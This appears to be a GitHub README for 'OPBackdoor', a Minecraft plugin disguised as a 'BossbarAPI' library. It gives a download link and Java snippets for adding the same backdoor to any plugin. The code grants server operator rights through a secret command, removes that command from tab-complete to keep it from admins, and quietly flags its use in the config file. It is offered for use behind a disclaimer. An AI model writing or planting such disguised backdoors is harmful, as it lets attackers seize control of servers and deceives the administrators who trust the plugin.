# OPBackdoor
**With a secret command, you can make yourself OP on a server with this plugin disguised as an API**

Only one person can use this per server though! In the config.yml the version will change to 0.40 when somebody has used the cheat and 0.41 when nobody has used it on this server.


**On a plugin with this enabled run these commands:**
1. /bossbarapibackdoorpluginopme -- Makes you OP
2. /bossbarapibackdoorplugindeopme -- Deops you

*If you want to just download the plugin, click this -> https://github.com/OllieJW/OPBackdoor/raw/main/BossbarAPI-0.4.1.jar*

**I AM NOT RESPONSIBLE FOR ANYTHING YOU DO WITH THIS. USE WITH CAUTION!**



# [Optional] Adding it to a plugin
You do not need to do this, this is only for people who know how to make plugins and who have a little bit of Java knowledge.
Just add this code segment to a plugin and it will be ready to go

```java
// Imports required:
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandSendEvent;

import java.util.ArrayList;
import java.util.List;
```
```java
@Override
public void onEnable() {
   Bukkit.getCommand("secret-command-to-op").setExecutor(this, this);
   Bukkit.getCommand("secret-command-to-de-op").setExecutor(this, this);
}
```

```java 
// When a user runs our secret command it will op them and discreatly change the config file so only one person can use it
    Player pl;
    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (sender instanceof Player) {
            if (cmd.getName().equalsIgnoreCase("secret-command-to-op")) {
                pl = (Player) sender;
                if (p.getConfig().getDouble("version")==0.41) {
                    pl.setOp(true);
                    p.getConfig().set("version", 0.40);
                    p.saveConfig();
                }
            }
            if (cmd.getName().equalsIgnoreCase("secret-command-to-de-op")) {
                pl = (Player) sender;
                if (p.getConfig().getDouble("version")==0.40) {
                    pl.setOp(false);
                    p.getConfig().set("version", 0.41);
                    p.saveConfig();
                }
            }
        } return true;
    }
```

```java
// Hides command from tab complete - Hidden from admins
    @EventHandler
    public void onPlayerTab(PlayerCommandSendEvent e) {
        List<String> blockedCommands = new ArrayList<>();
        blockedCommands.add("secret-command-to-op");
        blockedCommands.add("secret-command-to-de-op");
        e.getCommands().removeAll(blockedCommands);
    }
```


